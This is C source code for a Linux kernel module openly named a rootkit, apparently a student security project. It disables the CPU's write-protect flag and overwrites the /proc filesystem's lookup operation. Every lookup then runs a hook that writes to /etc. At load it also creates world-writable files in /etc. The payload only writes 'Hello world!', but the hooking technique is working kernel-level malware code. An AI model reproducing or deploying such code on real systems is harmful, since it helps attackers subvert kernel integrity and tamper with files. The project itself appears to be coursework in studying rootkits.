#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/preempt.h>
#include <linux/uaccess.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <asm/paravirt.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/path.h>
#include <linux/namei.h>
#include <linux/fs_struct.h>    //for xchg(&current->fs->umask, ... )
#include <asm/cacheflush.h>
#include <linux/version.h>      //for checking kernel version

// #define MODULE license
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Biondi Antonio M63001300 - Esposito Stefano M63001342 - Guariniello Pasquale M63001341");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("Create and modify file with VFS hooking when searching for a file or resource within the filesystem");

#define FILE_SUFFIX ".rootkit"

#define LOG_SEPARATOR "\n.............................................................\n"
#define DEBUG 0

#if defined(__i386__)
    #define POFF 1 
    #define CSIZE 6
    // push address, addr, ret 
    char *jmp_code="\x68\x00\x00\x00\x00\xc3"; 
    typedef unsigned int PSIZE;
#else
    #define POFF 2
    #define CSIZE 12 
    // mov address to register rax, jmp rax. for normal x64 convention 
    char *jmp_code="\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0";
    typedef unsigned long PSIZE;
#endif

struct dentry * (*orig_proc_lookup) (struct inode *,struct dentry *, unsigned int);

/*functions for r/w files copied from stackoverflow*/
struct file *file_open(const char *path, int flags, int rights)
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());

    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp))
    {
    	err = PTR_ERR(filp);
    	return NULL;
    }
    return filp;
}

void file_close(struct file *file)
{
    if(file)
        filp_close(file, NULL);
}

int file_read(struct file *file, unsigned long long offset,
    unsigned char *data, unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_write(struct file *file, unsigned long long offset,
    const unsigned char *data, unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_sync(struct file *file)
{
    vfs_fsync(file, 0);
    return 0;
}
/*end of functions for r/w files copied from stackoverflow*/

static void create_file(char *name)
{
    struct file *f;
    char *path;

    mode_t old_mask = xchg(&current->fs->umask, 0);

    path = kzalloc(strlen(name) + strlen(FILE_SUFFIX) + 1, GFP_KERNEL);

    if (!path)
        return;

    strcpy(path, name);
    strcat(path, FILE_SUFFIX);

    f = file_open(path, O_CREAT, 0777);
    if (f)
        file_close(f);

    kfree(path);

    xchg(&current->fs->umask, old_mask);
}

void write_helloworld(const char *filename)
{
    char text[13] = "Hello world!";
    int err;
    size_t size_text;
    struct file *f = NULL;
    long long file_size;
    struct path p;
    struct kstat ks;
    char *full_path = kzalloc(strlen("/etc/") + strlen(filename)
        + strlen(FILE_SUFFIX) + 1, GFP_KERNEL);
    current->flags |= PF_SUPERPRIV;

    if (full_path == NULL)
    	goto end;

    strcpy(full_path, "/etc/");
    strcat(full_path, filename);
    strcat(full_path, FILE_SUFFIX);

    if(DEBUG) printk(KERN_INFO "saving to log\n");

    f = file_open(full_path, O_WRONLY | O_CREAT, 0777);
    if (f == NULL)
    	goto end;

    kern_path(full_path, 0, &p);
    
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,11,0)
    err = vfs_getattr(&p, &ks, 0xFFFFFFFF, 0);
#else
    err = vfs_getattr(&p, &ks);
#endif

    if (err)
    	goto end;

    file_size = ks.size;
    size_text = strlen(text);

    err = file_write(f, file_size, text, size_text);
    if (err == -EINVAL)
    	goto end;

    file_size += size_text;

    err = file_write(f, file_size, LOG_SEPARATOR, strlen(LOG_SEPARATOR));
    if (err == -EINVAL)
    	goto end;

    if(DEBUG) printk(KERN_INFO "ok\n");

end:
    if (f)
        file_close(f);
    kfree(full_path);
    current->flags |= PF_SUPERPRIV;
}

static void create_files(void)
{
    create_file("/etc/modules");
    create_file("/etc/HELLOWORLD");
}

struct dentry *liinux_lookup(struct inode *i, struct dentry *d,unsigned int flag){
    write_helloworld("HELLOWORLD");
    printk("now uid:%d\n",get_current_cred()->uid.val);
    return orig_proc_lookup(i, d, flag);
}

int SS_rootkit_init(void) {

    create_files();

    struct file *fp = filp_open("/proc", O_RDONLY|O_DIRECTORY, 0);
    if (IS_ERR(fp)) 
        return -1;

    //clear WP protect flag
    write_cr0(read_cr0() & (~0x10000));
    //do something
    //hijack lookup operation in proc fs
    struct inode_operations *orig_inode_op = (struct inode_operations *)fp->f_path.dentry->d_inode->i_op;
    orig_proc_lookup = orig_inode_op->lookup;
    orig_inode_op->lookup = liinux_lookup;

    //reset WP protect flag
    write_cr0(read_cr0() | 0x10000);
    
    printk("rootkit loaded\n");
    return 0;
}

void SS_rootkit_exit(void) {
    struct file *fp = filp_open("/proc", O_RDONLY|O_DIRECTORY, 0);
    if (IS_ERR(fp)) 
        return;

    write_cr0(read_cr0() & (~0x10000));

    struct inode_operations *orig_inode_op = (struct inode_operations *)fp->f_path.dentry->d_inode->i_op;
    orig_inode_op->lookup = orig_proc_lookup;
    
    write_cr0(read_cr0() | 0x10000);

    //end
    printk("rootkit unloaded\n");
}

module_init(SS_rootkit_init);
module_exit(SS_rootkit_exit);
